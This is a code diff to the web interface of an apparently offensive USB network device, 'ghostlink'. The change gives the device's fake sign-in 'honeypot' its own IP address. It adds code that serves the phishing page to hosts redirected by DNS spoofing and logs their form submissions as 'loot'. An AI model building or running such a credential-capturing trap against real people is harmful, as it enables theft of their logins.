@@ -297,6 +297,7 @@ BUTTON_HOLD_MS=1200
 NET_MODE=PASSIVE
 LIVESAVE=TRUE
 HONEYPOT=FALSE
+HONEYPOT_IP=172.32.0.254
 HONEYPOT_REDIRECT_AFTER=
 HONEYPOT_RULES=
 """
@@ -765,6 +766,32 @@ HTML = r"""<!doctype html>
   <section id="tab-Honeypot" class="tabcontent">
     <h3>Honeypot <span class="dim" style="font-size:12px;">(fake sign-in + loot capture)</span></h3>
 
+    <!-- Big "this is the honeypot IP" banner — the device assigns a
+         dedicated secondary IP on usb0 so the trap lives at its own URL
+         and the admin dashboard stays untouched on .93. -->
+    <div class="section" id="hpUrlBanner" style="border-left:4px solid var(--primary); padding-left:14px;">
+      <div class="flex-row" style="justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
+        <div>
+          <div class="dim" style="font-size:12px;">Honeypot URL</div>
+          <div style="font-family: ui-monospace, Menlo, monospace; font-size:20px; font-weight:600;">
+            <a id="hpUrlLink" href="#" target="_blank">—</a>
+          </div>
+          <div class="dim" style="font-size:11px; margin-top:4px;" id="hpUrlNote">
+            The device binds this address as a secondary IP on usb0.
+            Any PC in the same /16 can hit it directly; a trapped host
+            (REDIRECT_FROM / WEBSITE_VISIT rule) resolves there via dnsmasq.
+          </div>
+        </div>
+        <div class="flex-row" style="gap:8px; align-items:flex-end;">
+          <div>
+            <div class="dim" style="font-size:12px;">IP</div>
+            <input id="hpIp" type="text" placeholder="172.32.0.254" style="width:140px; font-family: ui-monospace, Menlo, monospace;">
+          </div>
+          <button class="btn-ghost" onclick="hpSaveIp()">Save IP</button>
+        </div>
+      </div>
+    </div>
+
     <div class="section">
       <h4>Status</h4>
       <div class="flex-row" style="justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
@@ -792,6 +819,7 @@ HTML = r"""<!doctype html>
         <div class="stat"><label>custom html</label>    <div class="val"       id="hpCustom">no</div></div>
         <div class="stat"><label>rules</label>          <div class="val"       id="hpRules">0</div></div>
         <div class="stat"><label>trap hosts</label>     <div class="val"       id="hpHosts">0</div></div>
+        <div class="stat"><label>IP on usb0</label>     <div class="val"       id="hpIpBound">no</div></div>
       </div>
     </div>
 
@@ -1969,6 +1997,24 @@ async function hpReload() {
                                         st.classList.toggle('on', !!s.enabled); }
   const a  = $('#hpAfter');   if (a)    a.value  = s.redirect_after || '';
   const r  = $('#hpRulesTxt');if (r)    r.value  = s.rules_text || '';
+  // Honeypot URL banner — the dedicated IP, clickable, with bound-status.
+  const ipIn = $('#hpIp');     if (ipIn) ipIn.value = s.ip || '';
+  const link = $('#hpUrlLink');
+  if (link) {
+    if (s.ip) {
+      link.textContent = s.url || ('http://' + s.ip + '/');
+      link.href        = s.url || ('http://' + s.ip + '/');
+    } else {
+      link.textContent = '(no IP configured)'; link.href = '#';
+    }
+  }
+  const note = $('#hpUrlNote');
+  if (note) {
+    if (!s.enabled) note.textContent = 'Honeypot is OFF — flip the switch to bind this IP on ' + (s.iface || 'usb0') + '.';
+    else if (!s.ip_bound) note.textContent = 'Honeypot is ON but the IP is NOT bound on ' + (s.iface || 'usb0') + ' yet. Save IP to try again.';
+    else note.textContent = 'Live on ' + (s.iface || 'usb0') + '. Any PC in the same /16 can hit it directly; trapped hosts resolve here via dnsmasq.';
+  }
+  $('#hpIpBound') && ($('#hpIpBound').textContent = s.ip_bound ? 'yes' : 'no');
   $('#hpLoot')   && ($('#hpLoot').textContent   = s.loot_count || 0);
   $('#hpCustom') && ($('#hpCustom').textContent = s.custom_html ? 'yes' : 'no');
   $('#hpRules')  && ($('#hpRules').textContent  = (s.rules_parsed || []).length);
@@ -2041,6 +2087,18 @@ function hpPreview() {
   const w = window.open('', '_blank');
   const html = ($('#hpHtml') && $('#hpHtml').value) || '';
   w.document.open(); w.document.write(html); w.document.close();
+}
+
+async function hpSaveIp() {
+  const v = (($('#hpIp') && $('#hpIp').value) || '').trim();
+  // Loose check — accept blank (= disable), else a dotted-quad.
+  if (v && !/^(?:\d{1,3}\.){3}\d{1,3}$/.test(v)) {
+    alert('Enter a dotted-quad IPv4 (e.g. 172.32.0.254) or leave blank.');
+    return;
+  }
+  await cfgOverlaySet({ HONEYPOT_IP: v });
+  toast('IP saved — rebinding…');
+  setTimeout(hpReload, 500);
 }
 
 async function hpSaveBehavior() {
@@ -2946,6 +3004,33 @@ def _check_internet(timeout=1.5):
         except Exception: pass
 
 
+def _honeypot_apply_ip(cfg=None):
+    """Add the honeypot's secondary IP to usb0 when HONEYPOT=TRUE, remove
+    it when HONEYPOT=FALSE. Idempotent — EEXIST / ENOENT are both fine.
+    Returns the IP currently assigned (or '' if none)."""
+    if cfg is None: cfg = load_cfg()
+    want = cfg.get("HONEYPOT","FALSE").upper() == "TRUE"
+    ip   = (cfg.get("HONEYPOT_IP","") or "").strip()
+    if not ip:
+        return ""
+    iface = cfg.get("DNSMASQ_IFACE","usb0") or "usb0"
+    try:
+        if want:
+            subprocess.run(["ip","addr","add",f"{ip}/16","dev",iface],
+                           capture_output=True, timeout=3)
+        else:
+            subprocess.run(["ip","addr","del",f"{ip}/16","dev",iface],
+                           capture_output=True, timeout=3)
+    except Exception: pass
+    # verify
+    try:
+        r = subprocess.run(["ip","-o","addr","show","dev",iface],
+                           capture_output=True, text=True, timeout=2)
+        return ip if (ip in r.stdout) else ""
+    except Exception:
+        return ip if want else ""
+
+
 def _honeypot_rules(cfg):
     """Parse HONEYPOT_RULES config block. One rule per line. The DSL is
     intentionally forgiving — we accept extra whitespace, commas, equals,
@@ -3198,30 +3283,42 @@ class Handler(http.server.BaseHTTPRequestHandler):
             pass
 
     def _maybe_honeypot(self):
-        """If HONEYPOT=TRUE and the Host matches a REDIRECT_FROM pattern,
-        serve the honeypot index.html INSTEAD of 302'ing to REDIRECT_TO.
+        """Serve the fake sign-in page when EITHER
+          (a) the request landed on the dedicated honeypot IP, OR
+          (b) HONEYPOT=TRUE AND the Host header matches a REDIRECT_FROM
+              or WEBSITE_VISIT pattern.
         Form POSTs to /_honeypot_submit get captured + logged + redirected."""
         cfg = load_cfg()
         if cfg.get("HONEYPOT", "FALSE").upper() != "TRUE": return False
-        host = self.headers.get("Host", "")
-        if not host: return False
-        host = host.split(":")[0].strip().lower()
-        if host in ("172.32.0.93", "ghostlink.local", "localhost", "127.0.0.1"): return False
-        pats = [p.strip().lower() for p in (cfg.get("REDIRECT_FROM","") or "").split(",") if p.strip()]
-        # Also pull hosts from HONEYPOT_RULES `WEBSITE_VISIT=foo REDIRECT_HONEYPOT`
-        for r in _honeypot_rules(cfg):
-            if r.get("trigger") == "WEBSITE_VISIT" and r.get("host"):
-                pats.append(r["host"])
-        pats_norm = []
-        for pp in pats:
-            if pp.startswith("http://"):  pp = pp[7:]
-            if pp.startswith("https://"): pp = pp[8:]
-            pats_norm.append(pp.split("/")[0])
-        matches = (host in pats_norm) or any(host.endswith("." + p) for p in pats_norm)
-        if not matches: return False
-        # Only intercept GET / and POST /_honeypot_submit; let everything else
-        # fall through (so the admin's dashboard still reaches / when they
-        # visit via 172.32.0.93).
+
+        # (a) Did we land on the honeypot IP? Separates the admin UI
+        # (always on .93) from the trap (its own .254 by default).
+        hp_ip = (cfg.get("HONEYPOT_IP","") or "").strip()
+        local_ip = ""
+        try: local_ip = self.connection.getsockname()[0]
+        except Exception: pass
+        hit_hp_ip = bool(hp_ip and local_ip and local_ip == hp_ip)
+
+        host = (self.headers.get("Host","") or "").split(":")[0].strip().lower()
+
+        if not hit_hp_ip:
+            # (b) Host-based intercept. Only triggers for OTHER host names —
+            # hitting the admin IP by name/host never serves the honeypot.
+            if not host: return False
+            if host in ("172.32.0.93", "ghostlink.local", "localhost", "127.0.0.1"): return False
+            pats = [p.strip().lower() for p in (cfg.get("REDIRECT_FROM","") or "").split(",") if p.strip()]
+            for r in _honeypot_rules(cfg):
+                if r.get("trigger") == "WEBSITE_VISIT" and r.get("host"):
+                    pats.append(r["host"])
+            pats_norm = []
+            for pp in pats:
+                if pp.startswith("http://"):  pp = pp[7:]
+                if pp.startswith("https://"): pp = pp[8:]
+                pats_norm.append(pp.split("/")[0])
+            matches = (host in pats_norm) or any(host.endswith("." + p) for p in pats_norm)
+            if not matches: return False
+
+        # Only intercept GET; let the POST capture handler run on its own
         if self.path == "/_honeypot_submit": return False     # POST handler
         html = ""
         try: html = HONEY_HTML.read_text(encoding="utf-8")
@@ -3464,6 +3561,15 @@ document.addEventListener('submit', function(e){
             if HONEY_LOOT.exists():
                 try: loot_n = sum(1 for _ in HONEY_LOOT.open())
                 except Exception: pass
+            # Is the honeypot IP currently bound to the iface?
+            hp_ip = (cfg.get("HONEYPOT_IP","") or "").strip()
+            ip_bound = False
+            iface = cfg.get("DNSMASQ_IFACE","usb0") or "usb0"
+            try:
+                r = subprocess.run(["ip","-o","addr","show","dev",iface],
+                                   capture_output=True, text=True, timeout=2)
+                ip_bound = bool(hp_ip and hp_ip in r.stdout)
+            except Exception: pass
             self._send_json({
                 "enabled":        cfg.get("HONEYPOT","FALSE").upper()=="TRUE",
                 "custom_html":    custom,
@@ -3473,6 +3579,10 @@ document.addEventListener('submit', function(e){
                 "rules_parsed":   _honeypot_rules(cfg),
                 "loot_count":     loot_n,
                 "redirect_from":  cfg.get("REDIRECT_FROM",""),
+                "ip":             hp_ip,
+                "iface":          iface,
+                "ip_bound":       ip_bound,
+                "url":            f"http://{hp_ip}/" if hp_ip else "",
             })
         elif p == "/api/honeypot/loot":
             out = []
@@ -3587,6 +3697,7 @@ document.addEventListener('submit', function(e){
                         "DNS_UPSTREAM", "REDIRECT", "REDIRECT_FROM",
                         "REDIRECT_TO", "DNS_SPOOF", "DNS_SPOOF_HOSTS",
                         "HONEYPOT_RULES")
+            HP_KEYS  = ("HONEYPOT", "HONEYPOT_IP", "DNSMASQ_IFACE")
             old = load_cfg()
             tmp = CFG_PATH.with_suffix(".new")
             tmp.write_bytes(body); tmp.replace(CFG_PATH)
@@ -3596,6 +3707,18 @@ document.addEventListener('submit', function(e){
                 try: subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "reload-dnsmasq"],
                                     timeout=5, capture_output=True)
                 except Exception: pass
+            # Add/remove the honeypot's secondary IP if HONEYPOT or its IP changed.
+            if any(old.get(k, "") != new.get(k, "") for k in HP_KEYS):
+                # If HONEYPOT_IP itself changed, strip the OLD one first so we
+                # don't leave an orphan secondary address on the iface.
+                if old.get("HONEYPOT_IP") and old.get("HONEYPOT_IP") != new.get("HONEYPOT_IP"):
+                    try:
+                        iface = old.get("DNSMASQ_IFACE","usb0") or "usb0"
+                        subprocess.run(["ip","addr","del",
+                                        f"{old['HONEYPOT_IP']}/16","dev",iface],
+                                       capture_output=True, timeout=3)
+                    except Exception: pass
+                _honeypot_apply_ip(new)
             # NOTE: HID gadget rebind is intentionally NOT triggered here. On
             # the Luckfox RV1106 stock gadget, writing to UDC tears down
             # ffs.adb (FunctionFS backed by adbd); adbd does not survive the
@@ -4166,6 +4289,10 @@ def main():
         sys.stderr.write(f"webui: giving up on {bind}:{port}, another instance owns it\n")
         return
     sys.stderr.write(f"webui listening {bind}:{port}\n")
+    # Apply honeypot IP at startup so the secondary address survives a
+    # webui restart without the admin having to toggle in the UI.
+    try: _honeypot_apply_ip(cfg)
+    except Exception: pass
     try:
         s.serve_forever()
     except KeyboardInterrupt:
